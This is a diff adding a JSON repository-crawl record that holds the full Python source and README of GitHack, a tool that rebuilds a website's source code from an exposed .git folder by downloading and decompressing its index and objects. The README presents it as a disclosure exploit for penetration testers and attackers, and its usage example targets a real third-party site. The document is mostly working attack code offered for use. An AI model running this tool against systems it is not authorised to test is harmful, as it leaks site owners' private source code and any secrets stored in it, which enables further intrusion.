@@ -1,0 +1,35 @@
+{
+  "metadata": {
+    "timestamp": 1736560419047,
+    "page": 982,
+    "hasNextPage": true,
+    "endCursor": "Y3Vyc29yOjk5MA==",
+    "completionStatus": "IN_PROGRESS"
+  },
+  "repositories": [
+    {
+      "nameWithOwner": "lijiejie/GitHack",
+      "stars": 3212,
+      "defaultBranch": "master",
+      "files": [
+        {
+          "name": "GitHack.py",
+          "type": "blob",
+          "size": 4.6767578125,
+          "content": "#!/usr/bin/env python\n# -*- encoding: utf-8 -*-\n\nimport sys\ntry:\n    # python 2.x\n    import urllib2\n    import urlparse\n    import Queue\nexcept Exception as e:\n    # python 3.x\n    import urllib.request as urllib2\n    import urllib.parse as urlparse\n    import queue as Queue\n\nimport os\nimport zlib\nimport threading\nimport re\nimport time\nfrom lib.parser import parse\nimport ssl\n\ncontext = ssl._create_unverified_context()\nuser_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ' \\\n             'Chrome/99.0.4844.82 Safari/537.36'\nif len(sys.argv) == 1:\n    msg = \"\"\"\nA `.git` folder disclosure exploit. By LiJieJie\n\nUsage: python GitHack.py http://www.target.com/.git/\n\"\"\"\n    print(msg)\n    sys.exit(0)\n\n\nclass Scanner(object):\n    def __init__(self):\n        self.base_url = sys.argv[-1]\n        self.domain = urlparse.urlparse(sys.argv[-1]).netloc.replace(':', '_')\n        print('[+] Download and parse index file ...')\n        try:\n            data = self._request_data(sys.argv[-1] + '/index')\n        except Exception as e:\n            print('[ERROR] index file download failed: %s' % str(e))\n            exit(-1)\n        with open('index', 'wb') as f:\n            f.write(data)\n        if not os.path.exists(self.domain):\n            os.mkdir(self.domain)\n        self.dest_dir = os.path.abspath(self.domain)\n        self.queue = Queue.Queue()\n        for entry in parse('index'):\n            if \"sha1\" in entry.keys():\n                entry_name = entry[\"name\"].strip()\n                if self.is_valid_name(entry_name):\n                    self.queue.put((entry[\"sha1\"].strip(), entry_name))\n                    try:\n                        print('[+] %s' % entry['name'])\n                    except Exception as e:\n                        pass\n\n        self.lock = threading.Lock()\n        self.thread_count = 10\n        self.STOP_ME = False\n\n    def is_valid_name(self, entry_name):\n        if entry_name.find('..') >= 0 or \\\n                entry_name.startswith('/') or \\\n                entry_name.startswith('\\\\') or \\\n                not os.path.abspath(os.path.join(self.domain, entry_name)).startswith(self.dest_dir):\n            try:\n                print('[ERROR] Invalid entry name: %s' % entry_name)\n            except Exception as e:\n                pass\n            return False\n        return True\n\n    @staticmethod\n    def _request_data(url):\n        request = urllib2.Request(url, None, {'User-Agent': user_agent})\n        return urllib2.urlopen(request, context=context).read()\n\n    def _print(self, msg):\n        self.lock.acquire()\n        try:\n            print(msg)\n        except Exception as e:\n            pass\n        self.lock.release()\n\n    def get_back_file(self):\n        while not self.STOP_ME:\n            try:\n                sha1, file_name = self.queue.get(timeout=0.5)\n            except Exception as e:\n                break\n            for i in range(3):\n                try:\n                    folder = '/objects/%s/' % sha1[:2]\n                    data = self._request_data(self.base_url + folder + sha1[2:])\n                    try:\n                        data = zlib.decompress(data)\n                    except:\n                        self._print('[Error] Fail to decompress %s' % file_name)\n                    # data = re.sub(r'blob \\d+\\00', '', data)\n                    try:\n                        data = re.sub(r'blob \\d+\\00', '', data)\n                    except Exception as e:\n                        data = re.sub(b\"blob \\\\d+\\00\", b'', data)\n                    target_dir = os.path.join(self.domain, os.path.dirname(file_name))\n                    if target_dir and not os.path.exists(target_dir):\n                        os.makedirs(target_dir)\n                    with open(os.path.join(self.domain, file_name), 'wb') as f:\n                        f.write(data)\n                    self._print('[OK] %s' % file_name)\n                    break\n                except urllib2.HTTPError as e:\n                    if str(e).find('HTTP Error 404') >= 0:\n                        self._print('[File not found] %s' % file_name)\n                        break\n                except Exception as e:\n                    self._print('[Error] %s' % str(e))\n        self.exit_thread()\n\n    def exit_thread(self):\n        self.lock.acquire()\n        self.thread_count -= 1\n        self.lock.release()\n\n    def scan(self):\n        for i in range(self.thread_count):\n            t = threading.Thread(target=self.get_back_file)\n            t.start()\n\n\nif __name__ == '__main__':\n    s = Scanner()\n    s.scan()\n    try:\n        while s.thread_count > 0:\n            time.sleep(0.1)\n    except KeyboardInterrupt as e:\n        s.STOP_ME = True\n        time.sleep(1.0)\n        print('User Aborted.')\n"
+        },
+        {
+          "name": "README.md",
+          "type": "blob",
+          "size": 1.14453125,
+          "content": "# GitHack\n\n\n### This is important\n### All users please git pull to update source code. (2022-05-09)  \n\nGitHack is a `.git` folder disclosure exploit. \n\nIt rebuild source code from .git folder while keep directory structure unchanged.\n\nGitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。\n\n渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。\n\n## Change Log\n\n* 2022-05-09: Bug fix, thanks  [@justinsteven](https://github.com/justinsteven) . \n* 2022-04-07：Fix arbitrary file write vulnerability.  Thanks for [@justinsteven](https://github.com/justinsteven)  \\'s bug report, it's very helpful.\n* 2022-04-07：Add python3.x support\n\n## How It works ##\n\n* 解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )\n* 去.git/objects/ 文件夹下下载对应的文件\n* zlib解压文件，按原始的目录结构写入源代码\n\n## Usage ##\n    python GitHack.py http://www.openssl.org/.git/\n\n## Thanks ##\nThanks for sbp's great work, I used his .git index parser [gin - a Git index file parser](https://github.com/sbp/gin).\n\n"
+        },
+        {
+          "name": "lib",
+          "type": "tree",
+          "content": null
+        }
+      ]
+    }
+  ]
+}
